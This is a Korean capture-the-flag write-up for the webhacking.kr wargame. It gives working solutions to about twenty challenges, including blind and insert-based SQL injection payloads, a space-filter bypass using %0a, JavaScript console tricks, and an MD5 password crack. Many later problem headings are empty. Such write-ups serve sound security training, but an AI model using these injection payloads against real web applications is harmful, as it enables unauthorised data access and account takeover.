# BOB 7기 취약점분석 이주창 
## webhacking.kr All clear & write-up
![auth](./img/break.png)

## Writeup

### prob1
```php
$password="????";

if(eregi("[^0-9,.]",$_COOKIE[user_lv])) $_COOKIE[user_lv]=1;

if($_COOKIE[user_lv]>=6) $_COOKIE[user_lv]=1;

if($_COOKIE[user_lv]>5) @solve();

echo("<br>level : $_COOKIE[user_lv]");
```
다음 조건과 맞게 cookie를 바꿔주면 된다. 5.5로 해주면 될듯 하다.

![prob1](./img/prob1.png)

### prob2
```
bbs 페이지의 테이블명 : FreeB0aRd

admin 페이지의 테이블명 : admin
```
예전에 힌트로 주어졌다고 하는 모양이다. ( 정 알 방법이 없는거같아서 write-up을 봤다 )

이 문제에서는 time이라는 cookie가 있는데, 여기서 true/false에 따라서 주석에 있는 시간이 바뀐다. 따라서 blind sqli가 가능하다.

```
# board.py

```

### prob3
### prob4
### prob5
### prob6
### prob7
문제 깨졌습니다..

### prob8

select query에는 $_SERVER[HTTP_USER_AGENT]를 사용하고 insert부분에서는 파싱된 $agent를 사용하는데, 이때 insert based SQLi가 가능하다. 이를 통해서 admin을 따면 된다.

__Core Exploit__ : c2w2m2', '1', 'admin'), ('2

__Exploit__ : [prob8.py](./exploit/prob8.py)

![prob8](./img/prob8.png)

### prob9
no에서 if를 응용한 blind SQLi가 가능하다. =, 띄어쓰기가 막혔음으로, substr과 strcmp를 이용하여 id를 가져오면 된다.

__Core Exploit__ : if(strcmp(0x62,0x61),3,0)

__Exploit__ : [prob9.py](./exploit/prob9.py)

![prob9](./img/prob9.png)

### prob10
javascript를 보면 hackme의 posLeft가 800이되면 플래그가 나올거 같다.

__Exploit__ 
```javascript
hackme.style.posLeft=800; if(hackme.style.posLeft==800)hackme.href='?go='+hackme.style.posLeft
```
![prob10](./img/prob10.png)

### prob11
```
$pat="/[1-3][a-f]{5}_.*218.146.20.61.*\tp\ta\ts\ts/";
```
다음같은 정규식을 만족하면 flag를 준다.

__Exploit__ : 2abbbb_0218.146.20.610%09p%09a%09s%09s

![prob11](./img/prob11.png)

### prob12

javascript challenge라고 한다. 코드를 열어보면

```javascript
WorkTimeFun = String.fromCharCode(118, 97, ..., 13, 10);
eval(WorkTimeFun);
```

이라는 코드가 있는데, eval로 실행시키는걸로 보아 WorkTimeFun이 그냥 코드같다.

그래서 이걸 보면

```javascript
var enco='';
var enco2=126;
var enco3=33;
var ck=document.URL.substr(document.URL.indexOf('='));
 
 
for(i=1;i<122;i++)
{
enco=enco+String.fromCharCode(i,0);
}
 
function enco_(x)
{
return enco.charCodeAt(x);
}
 
if(ck=="="+String.fromCharCode(enco_(240))+String.fromCharCode(enco_(220))+String.fromCharCode(enco_(232))+String.fromCharCode(enco_(192))+String.fromCharCode(enco_(226))+String.fromCharCode(enco_(200))+String.fromCharCode(enco_(204))+String.fromCharCode(enco_(222-2))+String.fromCharCode(enco_(198))+"~~~~~~"+String.fromCharCode(enco2)+String.fromCharCode(enco3))
{
alert("Password is "+ck.replace("=",""));
}
```

이걸 보면 마지막에 ch == "=" + String.fromCharCode(enco_(240)) ~~~ 를 if문으로 체크하는데, 이게 flag일거 같다.

그래서 실제로 보니까

![prob11](./img/prob12.png)

여기서 =을 replace한 값이 플래그다.

### prob13

no에서 blind SQLi가 가능하다. space는 %0a로 우회하면된다. substr과 in을 사용해서 blind SQLi를 하면 된다.

__Core Exploit__ : (substr((select min(flag) from prob13password ), 1,1 )in(0x41))

__Exploit__ : [prob13.py](./exploit/prob13.py)

![prob13](./img/prob13.png)

마지막 한글자가 짤렸는데, r이다.

### prob14

javascript challenge다.

```javascript
function ck()
{
var ul=document.URL;
ul=ul.indexOf(".kr");
ul=ul*30;
if(ul==pw.input_pwd.value) { alert("Password is "+ul*pw.input_pwd.value); }
else { alert("Wrong"); }
}
```

ul값이 pw다. 실행시켜보면 510이 나온다. 

![prob14](./img/prob14.png)



### prob15

들어가면 바로 Access_Denied 띄우는데, 소스보기 누르면 

```javascript
alert("Access_Denied");
history.go(-1);
document.write("password is off_script");
```



### prob16

```javascript
function mv(cd)
{
kk(star.style.posLeft-50,star.style.posTop-50);
if(cd==100) star.style.posLeft=star.style.posLeft+50;
if(cd==97) star.style.posLeft=star.style.posLeft-50;
if(cd==119) star.style.posTop=star.style.posTop-50;
if(cd==115) star.style.posTop=star.style.posTop+50;
if(cd==124) location.href=String.fromCharCode(cd);
}
```

location.href = String.fromCharCode(cd); 를 실행시키는데, cd==124일때 하니까, 그걸 넣어서 해주면 된다.

![prob16](./img/prob16.png)

### prob17

```javascript
unlock=100*10*10+100/10-10+10+50-9*8+7-6+5-4*3-2*1*10*100*10*10+100/10-10+10+50-9*8+7-6+5-4*3-2*1*10*100*10*10+100/10-10+10+50-9*8+7-6+5-4*3-2*1*10*100*10*10+100/10-10+10+50-9*8+7-6+5-4*3-2*1*10/100*10*10+100/10-10+10+50-9*8+7-6+5-4*3-2*1*10*100*10*10+100/10-10+10+50-9*8+7-6+5-4*3-2*1*10+100*10*10+100/10-10+10+50-9*8+7-6+5-4*3-2*1*10-100*10*10+100/10-10+10+50-9*8+7-6+5-4*3-2*1*10/100*10*10+100/10-10+10+50-9*8+7-6+5-4*3-2*1*10/100*10*10+100/10-10+10+50-9*8+7-6+5-4*3-2*1*10/100*10*10+100/10-10+10+50-9*8+7-6+5-4*3-2*1*10/100*10*10+100/10-10+10+50-9*8+7-6+5-4*3-2*1*10/100*10*10+100/10-10+10+50-9*8+7-6+5-4*3-2*1*10/100*10*10+100/10-10+10+50-9*8+7-6+5-4*3-2*1*10/100*10*10+100/10-10+10+50-9*8+7-6+5-4*3-2*1*10/100*10*10+100/10-10+10+50-9*8+7-6+5-4*3-2*1*10/100*10*10+100/10-10+10+50-9*8+7-6+5-4*3-2*1*10*100*10*10+100/10-10+10+50-9*8+7-6+5-4*3-2*1*10*100*10*10+100/10-10+10+50-9*8+7-6+5-4*3-2*1*10*100*10*10+100/10-10+10+50-9*8+7-6+5-4*3-2*1*10*100*10*10+100/10-10+10+50-9*8+7-6+5-4*3-2*1*10*100*10*10+100/10-10+10+50-9*8+7-6+5-4*3-2*1*10*100*10*10+100/10-10+10+50-9*8+7-6+5-4*3-2*1*10*100*10*10+100/10-10+10+50-9*8+7-6+5-4*3-2*1*10+9999999999;
```

계산하면된다.

![prob17](./img/prob17.png)

### prob18

```php
if($_GET[no]) 
{ 

if(eregi(" |/|\(|\)|\t|\||&|union|select|from|0x",$_GET[no])) exit("no hack"); 

$q=@mysql_fetch_array(mysql_query("select id from challenge18_table where id='guest' and no=$_GET[no]")); 

if($q[0]=="guest") echo ("hi guest"); 
if($q[0]=="admin") 
{ 
@solve(); 
echo ("hi admin!"); 
} 

} 
```

띄어쓰기는 %0a로 우회하고, or를 이용해서 조건을 true로 만들고, limit으로 값을 줄여서 꺼내면 될 거같다.

__Exploit__ : 1%0aor%0a1=1%0alimit%0a1,1

![prob18](./img/prob18.png)

### prob19
문제 깨졌습니다..

### prob20

모든 인풋을 값을 맞춰서 2초안에 넣으면 된다.

```javascript
lv5frm.id.value="c2w2m2";
lv5frm.cmt.value="hello";
lv5frm.hack.value=lv5frm.attackme.value;
ck()
```

다음같은 간단한 js를 짜고, 콘솔에다가 2초안에 복사 붙여넣기 하면 풀린다.

![prob20](./img/prob20.png)

### prob21

문제에서 준 그대로 blind SQLi하면 된다.

__Core Exploit__ : ascii(substr(pw, 1,1))=97

__Exploit__ : [prob21.py](./exploit/prob21.py)

 ![prob21](./img/prob21.png)

### prob22

Wrong과 Wrong password로 Blind SQLi가 가능하다.

__Core Exploit__ :  admin' and ascii(substr(pw, 1, 1)) = 41# 

__Exploit__ : [prob22.py](./exploit/prob22.py)

![prob22](./img/prob22.png)

돌리면 2a93a7cea083c6e9e02c97ec5a5d715a 의 md5 hash값이 나온다. 이를 https://www.md5online.org/md5-decrypt.html 에서 decrypt하면 **rainbowzombie** 가 나온다.

근데 여기서 뭘 해도 인증이 안되길래 writeup을 봤는데 test/1234로 로그인해서 salt를 알아내야 한다고 한다...



### prob23
### prob24
### prob25
### prob26
### prob27
### prob28
문제 깨졌습니다..

### prob29
### prob30
문제 깨졌습니다..

### prob31
### prob32
### prob33
### prob34
### prob35
### prob36
문제 깨졌습니다..

### prob37
문제 깨졌습니다..

### prob38
### prob39
### prob40
### prob41
### prob42
### prob43
### prob44
### prob45
### prob46
### prob47
### prob48
### prob49
### prob50
문제 깨졌습니다..

### prob51
### prob52
### prob53
### prob54
### prob55
### prob56
### prob57
문제 깨졌습니다..

### prob58
### prob59
### prob60
### prob61